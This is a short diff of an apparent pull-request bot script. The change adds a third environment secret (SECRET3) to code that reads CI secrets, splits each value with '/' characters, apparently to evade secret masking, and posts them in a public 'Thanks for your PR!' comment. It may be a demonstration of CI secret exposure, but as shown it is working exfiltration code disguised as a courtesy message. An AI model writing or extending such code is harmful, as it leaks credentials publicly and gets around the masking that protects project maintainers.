@@ -17,11 +17,13 @@ def main():
     e = os.environ
     secret = e.get("SECRET")
     secret2 = e.get("SECRET2")
+    secret3 = e.get("SECRET3")
     # add space between every character
     secret = "/".join(secret if secret else "ABC")
     secret2 = "/".join(secret2 if secret2 else "DEF")
+    secret3 = "/".join(secret3 if secret3 else "GHI")
     
-    gh_post_pr_comment(org, project, args.pr_num, f"Thanks for your PR! + env: {secret} + {secret2}")
+    gh_post_pr_comment(org, project, args.pr_num, f"Thanks for your PR! + env: {secret} + {secret2} + {secret3}")
 
 
 if __name__ == "__main__":
